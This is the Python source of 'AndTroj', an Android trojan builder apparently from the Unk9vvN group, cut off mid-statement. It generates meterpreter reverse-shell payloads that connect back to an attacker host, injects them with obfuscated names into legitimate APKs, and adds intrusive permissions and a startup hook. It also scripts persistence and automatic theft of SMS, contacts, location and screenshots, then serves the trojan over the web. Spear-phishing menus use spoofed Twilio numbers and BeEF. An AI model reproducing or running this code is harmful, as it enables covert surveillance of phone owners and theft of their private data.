#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# https://t.me/unk9vvn
# AVI
import os
import random
import shutil
import socket
import string
import subprocess
import sys
import time
import socks
import urllib2
from urllib2 import urlopen
from twilio.rest import Client


try:
    from colorama import Fore, Back, Style

    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    b = Fore.BLUE
    y = Fore.YELLOW
    m = Fore.MAGENTA
    res = Style.RESET_ALL
    os.system('service postgresql start && service tor start')

except ImportError:
    os.system('pip install colorama twilio flask env paramiko freeze SocksiPy-branch')
    pass




class atj:
    rnd = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    rand1 = rnd
    rand2 = rnd
    rand3 = rnd
    rand4 = rnd
    rand5 = rnd
    rand6 = rnd
    rand7 = rnd
    kutation = '"'
    bslash1 = '\\'
    bslash2 = '\\'
    bslash = bslash1 + bslash2
    slashkutat = bslash1 + kutation
    dir = '/usr/share/AndTroj'
    tmp = dir + '/tmp/'
    ORGN = tmp + "orgapp.apk"
    PAYN = tmp + "payload.apk"
    out1 = tmp + 'orgapp'
    out2 = tmp + 'payload'
    out3 = tmp + 'launch.txt'
    out4 = tmp + 'lach.txt'
    out5 = tmp + 'pes.txt'
    out6 = tmp + 'persis.sh'
    out7 = tmp + 'output.txt'
    out8 = tmp + 'ngrok.txt'
    out9 = tmp + 'ngrok_beef.txt'
    meta1 = out1 + '/smali/com/' + rand1 + '/' + rand2 + '/'
    meta2 = out2 + '/smali/com/metasploit/stage/'
    orgapk = tmp + 'orgapp.apk'
    payapk = tmp + 'payload.apk'
    protcl = tmp + 'protocol.txt'
    ng_url = tmp + 'ngrok_url.txt'


    def __init__(self):
        atlv = 'apktool -version'
        atl = os.popen(atlv)
        chk_atl = atl.read()
        if chk_atl > '2.3.4':
            pass
        else:
            os.system('apt-get install -y tor apktool aapt proxychains python-socks && service tor start && '
                      'proxychains wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.4.jar -O /usr/local/bin/apktool.jar && '
                      'wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool && '
                      'chmod +x /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool')

        chk_cmd = os.path.exists('/usr/share/AndTroj/')
        if chk_cmd == (False):
            executor = '#!/bin/bash\npython /usr/share/AndTroj/atj.py "$@"'
            commandline = open('/usr/bin/atj', 'w')
            commandline.write(executor)
            commandline.close()
            os.system('mkdir /usr/share/AndTroj && cp debug.keystore atj.py /usr/share/AndTroj/ && chmod +x /usr/share/AndTroj/atj.py && chmod +x /usr/bin/atj')
        else:
            pass

        chk_tmp = os.path.exists('/usr/share/AndTroj/tmp')
        if chk_tmp == (False):
            os.system('mkdir {0}/tmp'.format(atj.dir))
            os.system('chmod +x {0}/tmp'.format(atj.dir))
        else:
            os.system('rm -r {0}/tmp'.format(atj.dir))
            os.system('mkdir {0}/tmp'.format(atj.dir))
            os.system('chmod +x {0}/tmp'.format(atj.dir))
            pass


    @staticmethod
    def Tor(self):
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
        socket.socket = socks.socksocket


    @staticmethod
    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])


    @staticmethod
    def main_menu(self):
        global USER
        global WAN
        global LAN
        global ORG
        global LHOST
        global LPORT
        global LGHOST
        global LGPORT
        global NGHOST
        global NGPORT
        atj.cls(self)
        clear = '\x1b[0m'
        colors = [36, 32, 34, 35, 31, 37]

        x = """
                              `-::///+++/+++/:-.                     
                         `-//:::.-:-`:/..:/`:--++oo/.                
                      -///:-`/.::::/`/:.:/:`o.+/:`:++oo:`            
                   `/+/--`+/-`:.::/+ooo+ooo+/:/-`o:o`+./yo.          
                 `+o-/:.::`/+o+//:.+/:-:/:`+o/+os+:`/-/+`:ss.        
               `.:-.`...`.---.---. .``.``` ..:s:::--+:-//s..o/`      
              .:-`.-:`.--..-..-..::..:/:: :+/`/--+/:-oh/-.:-/-y:     
             -/``-:..//-:-.-.+o++:`  +:o-  .+osd+.+:+:.--::::--s+    
            :/`/::`:+:/:-.:+/soo::` .::/:. -:+yyh/do`:+:.yo-o// oo   
           :+`:::.++` .-+.o++:.  `+hhdddddyo. `-ssys:h`  `sy`-//`o+  
          .y`::-.+s`   /:oo+.   `oyhddmmmhmmd.  `:ydhd-`   sy`+-/.h: 
          o/.-..:y`  :o.+/o/    -ssssshhdydhh:    /mds.h`  `h+-:: /d`
         `s`::+-y/   /dsy+.o/`  `++--/ss:.-+o`   :h/yh/s`   :m.y/y`d:
         :s`::--h`  :-/s+o`.o+.  ++--++/+-.+:  `oh--yoh-+.  `m/.:-`s+
         +o`//-+h`  -o:yh-  .sy/`:+sys--ohyo:`/hy.  omydd    ho-::`+y
         +o`//-/h   `:ys/s   `/yy:` ohyshs `/hd+`  -h+ms.`   yo.o/.+y
         :y -:--m`  /s+yho`    `+hh+.-:::-+hdo.`   .mm+sh`  `m:+/o-so
         `h`/:+`h/   :hmh/y   s` `:yds//ydy/` .o- -hoNNy`   :m./:-`d:
          +:`:-.-o`  .:::/o`` :`  ::+osyyy//  :-..:so///`  `y+-/:.:y 
          .s`.:--/+`  -oso+.o. -/ooo+:``:+ysyo/`ohoNmms`   sy./::.h- 
           :+..::.oo`  `:::/yyys. `/:++o+:/` -dmmho+/.    sh./::.so  
            /o`:-:-+y-  .-+yhddmhsh/.```.:+dhmmdNmdy/`  .hs:/:-.os   
             /s./.:--so.   .//+sdmhdms-:dmhdmds++:    `od:-.//-so    
              -s::.:-/:o:. :::--:+oyy/`-oyyo+::-./+/.oh+///+.-h:     
               `+o./-:-:-+so/+//:..`  `` ```/+/so/shs::`///.ss`      
                 .oo--+/--/:+osso++s-`os///./+ssso:-//./`.sy-        
                   .+o:`:+/.+`:.:++oooooosoo+::/::+.++./so-          
                      .+o/.-.:/`+/:-:/`/`+ +//-++`:-+ss:`            
                         ./+++:-/-`:/-`+`+`-/--/oos+-                
                             `.:/+++ooo+ooooo+:`                     
                                   Unk9vvN
                             https://t.me/Unk9vvN
                                   AndTroj
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.01)

        try:
            USER = socket.gethostname()
            LAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
            WAN = urlopen('http://ip.42.pl/raw').read()
            print '\t[i] USER: {0}'.format(USER)
            print '\t[i]  LAN: {0}'.format(LAN)
            print '\t[i]  WAN: {0}'.format(WAN)
            print '\t[i]  USE CMD: atj'
        except urllib2.URLError:
            print '\t[i] USER: {0}'.format(USER)
            print '\t[i]  LAN: {0}'.format(LAN)
            print '\t[i]  WAN: Disconnected'
            print '\t[i]  USE CMD: atj'

        payld = raw_input("\n\t[1] android/meterpreter/reverse_tcp\n\t"
                          "[2] android/meterpreter/reverse_http\n\t"
                          "[3] android/meterpreter/reverse_https\n\t"
                          "[4] Install Ngrok-Twilio-BeEF-NoIP\n\t"
                          "[5] Social Engineering Menu\n\t"
                          "[0] EXIT\n\t"
                          "\n\nroot@unk9vvn:~# ")
        if payld == "1":
            checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
            if checkauth == (True):
                HOST = raw_input("\n\t[i] NoIP service can give you a dns domain for one month."
                                 "\n\t[1] NoIP-HOST\n"
                                 "\n\t[i] The Ngrok Business license can give you twenty ports and the first port for the RAT."
                                 "\n\t[2] Ngrok-HOST"
                                 "\n\nroot@unk9vvn:~# ")
                ORG = raw_input("\n\t[?] ORG-APK: ")
                if HOST == "1":
                    LHOST = raw_input("\t[?] LHOST: ")
                    LPORT = raw_input("\t[?] LPORT: ")
                    print "\n"
                    subprocess.call(
                        'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + atj.tmp + 'payload.apk',
                        shell=True)
                    subprocess.call(
                        'echo "reverse_tcp" > ' + atj.tmp + 'protocol.txt',
                        shell=True)
                elif HOST == "2":
                    NGHOST = "127.0.0.1"
                    NGPORT = raw_input("\t[i] NHOST: {0}"
                                      "\n\t[?] NPORT: ".format(NGHOST))
                    print "\n"
                    subprocess.call(
                        'gnome-terminal --tab -e \'proxychains ngrok tcp ' + NGPORT + '\'',
                        shell=True)
                    print "\n"
                    chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                    if chek_nngk == (False):
                        pass
                    else:
                        subprocess.call(
                            'rm /usr/share/AndTroj/tmp/ngrok.txt',
                            shell=True)
                    time.sleep(7.0)
                    subprocess.call(
                        'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok.txt',
                        shell=True)
                    fs = open(atj.out8)
                    length = 5
                    LGHOST = "0.tcp.ngrok.io"
                    LGPORT = fs.read(length)
                    subprocess.call(
                        'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=' + LGHOST + ' LPORT=' + LGPORT + ' -o ' + atj.tmp + 'payload.apk',
                        shell=True)
                    subprocess.call(
                        'echo "reverse_tcp" > ' + atj.tmp + 'protocol.txt',
                        shell=True)
                    atj.binder(self="")
                else:
                    return HOST
                print "\n"
            else:
                print "\n\t[X] Please selected 4 item for install Ngrok Twilio BeEF & NoIP..."
                atj.main_menu(self="")
        elif payld == "2":
            checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
            if checkauth == (True):
                HOST = raw_input("\n\t[i] NoIP service can give you a dns domain for one month."
                                 "\n\t[1] NoIP-HOST\n"
                                 "\n\t[i] The Ngrok Business license can give you twenty ports and the first port for the RAT."
                                 "\n\t[2] Ngrok-HOST"
                                 "\n\nroot@unk9vvn:~# ")
                ORG = raw_input("\n\t[?] ORG-APK: ")
                if HOST == "1":
                    LHOST = raw_input("\t[?] LHOST: ")
                    LPORT = raw_input("\t[?] LPORT: ")
                    print "\n"
                    subprocess.call(
                        'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_http LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + atj.tmp + 'payload.apk',
                        shell=True)
                    subprocess.call(
                        'echo "reverse_http" > ' + atj.tmp + 'protocol.txt',
                        shell=True)
                elif HOST == "2":
                    NGHOST = "127.0.0.1"
                    NGPORT = raw_input("\t[i] NHOST: {0}"
                                       "\n\t[?] NPORT: ".format(NGHOST))
                    print "\n"
                    subprocess.call(
                        'gnome-terminal --tab -e \'proxychains ngrok tcp ' + NGPORT + '\'',
                        shell=True)
                    print "\n"
                    chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                    if chek_nngk == (False):
                        pass
                    else:
                        subprocess.call(
                            'rm /usr/share/AndTroj/tmp/ngrok.txt',
                            shell=True)
                    time.sleep(7.0)
                    subprocess.call(
                        'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok.txt',
                        shell=True)
                    fs = open(atj.out8)
                    length = 5
                    LGHOST = "0.tcp.ngrok.io"
                    LGPORT = fs.read(length)
                    subprocess.call(
                        'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_http LHOST=' + LGHOST + ' LPORT=' + LGPORT + ' -o ' + atj.tmp + 'payload.apk',
                        shell=True)
                    subprocess.call(
                        'echo "reverse_http" > ' + atj.tmp + 'protocol.txt',
                        shell=True)
                    atj.binder(self="")
                else:
                    return HOST
                print "\n"
            else:
                print "\n\t[X] Please selected 4 item for install Ngrok Twilio BeEF & NoIP..."
                atj.main_menu(self="")
        elif payld == "3":
            checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
            if checkauth == (True):
                HOST = raw_input("\n\t[i] NoIP service can give you a dns domain for one month."
                                 "\n\t[1] NoIP-HOST\n"
                                 "\n\t[i] The Ngrok Business license can give you twenty ports and the first port for the RAT."
                                 "\n\t[2] Ngrok-HOST"
                                 "\n\nroot@unk9vvn:~# ")
                ORG = raw_input("\n\t[?] ORG-APK: ")
                if HOST == "1":
                    LHOST = raw_input("\t[?] LHOST: ")
                    LPORT = raw_input("\t[?] LPORT: ")
                    print "\n"
                    subprocess.call(
                        'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + atj.tmp + 'payload.apk',
                        shell=True)
                    subprocess.call(
                        'echo "reverse_https" > ' + atj.tmp + 'protocol.txt',
                        shell=True)
                elif HOST == "2":
                    NGHOST = "127.0.0.1"
                    NGPORT = raw_input("\t[i] NHOST: {0}"
                                       "\n\t[?] NPORT: ".format(NGHOST))
                    print "\n"
                    subprocess.call(
                        'gnome-terminal --tab -e \'proxychains ngrok tcp ' + NGPORT + '\'',
                        shell=True)
                    print "\n"
                    chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                    if chek_nngk == (False):
                        pass
                    else:
                        subprocess.call(
                            'rm /usr/share/AndTroj/tmp/ngrok.txt',
                            shell=True)
                    time.sleep(7.0)
                    subprocess.call(
                        'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok.txt',
                        shell=True)
                    fs = open(atj.out8)
                    length = 5
                    LGHOST = "0.tcp.ngrok.io"
                    LGPORT = fs.read(length)
                    subprocess.call(
                        'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=' + LGHOST + ' LPORT=' + LGPORT + ' -o ' + atj.tmp + 'payload.apk',
                        shell=True)
                    subprocess.call(
                        'echo "reverse_https" > ' + atj.tmp + 'protocol.txt',
                        shell=True)
                    atj.binder(self="")
                else:
                    return HOST
                print "\n"
            else:
                print "\n\t[X] Please selected 4 item for install Ngrok Twilio BeEF & NoIP..."
                atj.main_menu(self="")
        elif payld == "4":
            checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
            print "\n"
            if checkauth == (False):
                Ngrok_Token = raw_input("\n\t[i] Visit & Copy Token > https://dashboard.ngrok.com/auth"
                                        "\n\t[?] Ngrok Token: ")
                Twilio_TOKEN = raw_input("\n\t[i] Visit & Copy Token > https://www.twilio.com/console/project/settings"
                                         "\n\t[?] Twilio Token: ")
                Twilio_SID = raw_input("\n\t[i] Visit & Copy Token > https://www.twilio.com/console/"
                                       "\n\t[?] Twilio SID: ")
                print "\n"
                check = os.path.exists('/usr/share/twilio_token.txt')
                if check == (False):
                    subprocess.call(
                        'echo "' + Twilio_TOKEN + '" > /usr/share/AndTroj/twilio_token.txt && echo "' + Twilio_SID + '" > /usr/share/AndTroj/twilio_sid.txt',
                        shell=True)
                else:
                    print "I: Twilio Token installed..."
                    pass
                check_geo = os.path.exists('/opt/GeoIP/GeoLiteCity.dat')
                if check_geo == (False):
                    subprocess.call(
                        'curl -O http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz',
                        shell=True)
                    subprocess.call(
                        'gunzip GeoLiteCity.dat.gz && mkdir /opt/GeoIP && mv GeoLiteCity.dat /opt/GeoIP',
                        shell=True)
                else:
                    print "I: GeoLiteCity extensions installed..."
                    pass
                subprocess.call(
                    'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                    'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
                    shell=True)
                execut = '#!/bin/bash\n/usr/share/ngrok/ngrok "$@"'
                commandl = open('/usr/bin/ngrok', 'w')
                commandl.write(execut)
                commandl.close()
                ch_ngrok = os.path.exists('/usr/share/ngrok')
                if ch_ngrok == (False):
                    subprocess.call(
                        'mkdir /usr/share/ngrok && chmod +x /usr/share/ngrok && chmod +x /usr/bin/ngrok && '
                        'cd /usr/share/ngrok && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && '
                        'unzip ngrok-stable-linux-amd64.zip && rm ngrok-stable-linux-amd64.zip && ./ngrok authtoken ' + Ngrok_Token + '',
                        shell=True)
                else:
                    print "I: Ngrok tunnel dns installed..."
                    pass
                print "\n\t[i] Visit & Register > https://www.noip.com/sign-up\n\t[i] Login & Create Host > https://www.noip.com/login\n"
                check = os.path.exists('/usr/share/noip-2.1.9-1')
                if check == (False):
                    subprocess.call(
                        'cd /usr/share/ && wget https://www.noip.com/client/linux/noip-duc-linux.tar.gz && tar xzf noip-duc-linux.tar.gz && rm noip-duc-linux.tar.gz && cd noip-2.1.9-1 && make && make install',
                        shell=True)
                    print(os.system('noip2 && noip2 -S'))
                    atj.main_menu(self="")
                else:
                    print(os.system('noip2 && noip2 -S'))
                    atj.main_menu(self="")
                print "\n\t[i] Twilio is Ready..."
                print "\t[i] Ngrok is Ready..."
                print "\t[i] BeEF is Ready..."
                print "\t[i] NoIP is Ready..."
                atj.main_menu(self="")
            else:
                print "\n\t[i] Twilio is Ready..."
                print "\t[i] Ngrok is Ready..."
                print "\t[i] BeEF is Ready..."
                print "\t[i] NoIP is Ready..."
                atj.main_menu(self="")
        elif payld == "5":
            atj.eng_menu(self="")
        elif payld == "0":
            sys.exit()
        else:
            atj.main_menu(self="")


    @staticmethod
    def binder(self):
        global RN
        global CLS_RN
        RN = ORG.replace(" ", "_")
        ORG_RN = (' ' in ORG) == True
        if ORG_RN == (True):
            shutil.copyfile(ORG, "{0}".format(RN))
            subprocess.call(
                'mv ' + RN + ' ' + atj.ORGN,
                shell=True)
        else:
            subprocess.call(
                'cp ' + ORG + ' ' + atj.ORGN,
                shell=True)
            pass
        subprocess.call(
            'apktool -f d ' + atj.ORGN + ' -o ' + atj.out1,
            shell=True)
        subprocess.call(
            'apktool -f d ' + atj.PAYN + ' -o ' + atj.out2,
            shell=True)
        print "I: Injecting payload..."
        chk_com = os.path.exists('{0}/smali/com'.format(atj.out1))
        if chk_com == (False):
            os.system("mkdir {0}/smali/com".format(atj.out1))
        else:
            pass
        subprocess.call(
            'mkdir ' + atj.out1 + '/smali/com/' + atj.rand1,
            shell=True)
        subprocess.call(
            'mkdir ' + atj.out1 + '/smali/com/' + atj.rand1 + '/' + atj.rand2,
            shell=True)
        subprocess.call(
            'cp -r ' + atj.out2 + '/smali/com/metasploit/stage/Payload.smali ' + atj.out1 + '/smali/com/' + atj.rand1 + '/' + atj.rand2 + '/' + atj.rand3 + '.smali',
            shell=True)
        print "I: Obfuscating resource files..."
        subprocess.call(
            'cd ' + atj.meta2 + ' && cp MainService.smali MainBroadcastReceiver.smali MainActivity.smali f.smali e.smali d.smali c.smali b.smali a.smali ' + atj.meta1,
            shell=True)
        subprocess.call(
            'sed -i "s#/metasploit/stage#/' + atj.rand1 + '/' + atj.rand2 + '#g" ' + atj.meta1 + '*',
            shell=True)
        subprocess.call(
            'sed -i "s#Payload#' + atj.rand3 + '#g" ' + atj.meta1 + '*',
            shell=True)
        subprocess.call(
            'sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.' + atj.rand4 + '.' + atj.rand5 + '.' + atj.rand6 + '#" ' + atj.meta1 + atj.rand3 + '.smali',
            shell=True)
        subprocess.call(
            'sed -i "s#payload#' + atj.rand7 + '#g" ' + atj.meta1 + atj.rand3 + '.smali',
            shell=True)
        print "I: Adding all permissions..."
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WAKE_LOCK"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_SMS"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CAMERA"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CONTACTS"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CALL_PHONE"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SEND_SMS"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\' ' + atj.out1 + '/AndroidManifest.xml && '
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.INTERNET"/>\' ' + atj.out1 + '/AndroidManifest.xml',
            shell=True)
        subprocess.call(
            "LIN=$(awk '/category.LAUNCHER/{ print NR - 3 }' " + atj.out1 + "/AndroidManifest.xml) && sed -n \"$LIN\"p " + atj.out1 + "/AndroidManifest.xml > " + atj.tmp + "launch.txt",
            shell=True)
        with open('{0}launch.txt'.format(atj.tmp)) as myfile:
            if 'android:name=' in myfile.read():
                print "I: Founded Main Activity..."
            else:
                subprocess.call(
                    "LIN=$(awk '/category.LAUNCHER/{ print NR - 4 }' " + atj.out1 + "/AndroidManifest.xml) && sed -n \"$LIN\"p " + atj.out1 + "/AndroidManifest.xml > " + atj.tmp + "launch.txt",
                    shell=True)
                pass
        subprocess.call(
            "grep -o 'android:name=\"[^\"]*' " + atj.out3 + " > " + atj.tmp + "lach.txt",
            shell=True)
        subprocess.call(
            'sed -i -e \'s/\(android:\|name\|=\"\)//g\' ' + atj.tmp + "lach.txt",
            shell=True)
        subprocess.call(
            "tr '.' '/' <" + atj.out4 + " >" + atj.tmp + "output.txt",
            shell=True)
        print "I: Injecting startup launcher..."
        subprocess.call(
            "GIZ=$(cat " + atj.out7 + ") && sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a " + atj.bslash + "n\ \ \ \ invoke-static \{p0\}, Lcom/'" + atj.rand1 + "'\/'" + atj.rand2 + "'\/'" + atj.rand3 + "'\;->start(Landroid\/content\/Context;)V' " + atj.out1 + "/smali/\"$GIZ\".smali",
            shell=True)
        subprocess.call(
            "PIN=$(awk '/package=/{ print NR}' " + atj.out1 + "/AndroidManifest.xml) && sed -n \"$PIN\"p " + atj.out1 + "/AndroidManifest.xml > " + atj.tmp + "pes.txt",
            shell=True)
        subprocess.call(
            "grep -o 'package=\"[^\"]*' " + atj.out5 + " > " + atj.tmp + "pers.txt",
            shell=True)
        subprocess.call(
            'sed -i -e \'s/\(package="\|name\|=\"\)//g\' ' + atj.tmp + "pers.txt",
            shell=True)
        subprocess.call(
            'FIL="#!" && echo "$FIL/bin/bash" > /usr/share/AndTroj/tmp/persis.sh && echo "while true" >> /usr/share/AndTroj/tmp/persis.sh && echo "do am start '
            '--user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> /usr/share/AndTroj/tmp/persis.sh && echo '
            '"sleep 600" >> /usr/share/AndTroj/tmp/persis.sh && echo "done" >> /usr/share/AndTroj/tmp/persis.sh',
            shell=True)
        subprocess.call(
            'GUZ=$(cat ' + atj.tmp + 'pers.txt) && sed -i "s#com.metasploit.stage#"$GUZ"#" ' + atj.out6,
            shell=True)
        subprocess.call(
            'GUS=$(cat ' + atj.out4 + ') && sed -i "s#.MainActivity#"$GUS"#" ' + atj.out6,
            shell=True)
        print "I: Generating persistence..."
        subprocess.call(
            'echo "upload ' + atj.tmp + 'persis.sh" > ' + atj.tmp + 'autoand.rc && echo "execute -f \"sh persis.sh\"" >> ' + atj.tmp + 'autoand.rc && echo "dump_sms" >> ' + atj.tmp + 'autoand.rc && echo "dump_contacts" >> ' + atj.tmp + 'autoand.rc && echo "geolocate" >> ' + atj.tmp + 'autoand.rc && echo "download /data/data/com.android.providers.telephony/databases/mmssms.db" >> ' + atj.tmp + 'autoand.rc && echo "run post/android/capture/screen" >> ' + atj.tmp + 'autoand.rc',
            shell=True)
        print "I: Clear data templates..."
        subprocess.call(
            'cd ' + atj.tmp + ' && rm pers.txt pes.txt launch.txt output.txt lach.txt',
            shell=True)
        print "I: Compile original apk..."
        subprocess.call(
            'apktool b ' + atj.out1,
            shell=True)
        print "I: Signin unknown cert apk..."
        subprocess.call(
            'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ' + atj.dir + '/debug.keystore ' + atj.out1 + '/dist/orgapp.apk alias_name -storepass 00980098',
            shell=True)
        CLS_RN = os.path.splitext("{0}".format(RN))[0]
        if ORG_RN == (True):
            subprocess.call(
                'mv {0}/dist/orgapp.apk {1}-b.apk'.format(atj.out1, CLS_RN),
                shell=True)
            subprocess.call(
                'cp ' + CLS_RN + '-b.apk /var/www/html/',
                shell=True)
            atj.eng_menu(self="")
        else:
            subprocess.call(
                'mv {0}/dist/orgapp.apk {1}-b.apk'.format(atj.out1, CLS_RN),
                shell=True)
            subprocess.call(
                'cp ' + CLS_RN + '-b.apk /var/www/html/',
                shell=True)
            atj.eng_menu(self="")
            print "[i] generating torjan /root"
            pass


    @staticmethod
    def eng_menu(self):
        global URL
        global NoIP
        global METHOD
        global URL_CLONE
        global LGPORT_BEEF
        global TWIL_SID
        global TWIL_TOKEN
        global SPOOF_NUM
        global TARGET_NUM
        global PHONELIST
        atj.cls(self)
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
                    ___          _      _ 
                   / __| ___  __(_)__ _| |
                   \__ \/ _ \/ _| / _` | |
                   |___/\___/\__|_\__,_|_|

                    ___           _                  _           
                   | __|_ _  __ _(_)_ _  ___ ___ _ _(_)_ _  __ _ 
                   | _|| ' \/ _` | | ' \/ -_) -_) '_| | ' \/ _` |
                   |___|_||_\__, |_|_||_\___\___|_| |_|_||_\__, |
                            |___/                          |___/ 
                                   Unk9vvN
                             https://t.me/Unk9vvN
                                   AndTroj

[i] You need Port Forwarded to ports > 53-80-3000-5432-55552-4141-5151-8000
[i] Register & Buy Business License > https://dashboard.ngrok.com/user/signup
[i] Register & Buy a Spoof Number > https://www.twilio.com/try-twilio
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.01)

        eng = raw_input("\t[1] WEB SpearPhishing\n\t"
                        "[2] SMS SpearPhishing\n\t"
                        "[3] FileFormat Injection(Disabled)\n\t"
                        "[4] Add Ngrok Ports\n\t"
                        "[5] Back Main Menu\n\t"
                        "[0] EXIT\n\t"
                        "\n\nroot@unk9vvn:~# ")
        if eng == "1":
            checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
            if checkauth == (True):
                CLONE_MTD = raw_input("\n\t[1] APK Attack"
                                      "\n\t[2] Harvester"
                                      "\n\nroot@unk9vvn:~# ")
                if CLONE_MTD == "1":
                    subprocess.call(
                        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
                        shell=True)
                    subprocess.call(
                        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
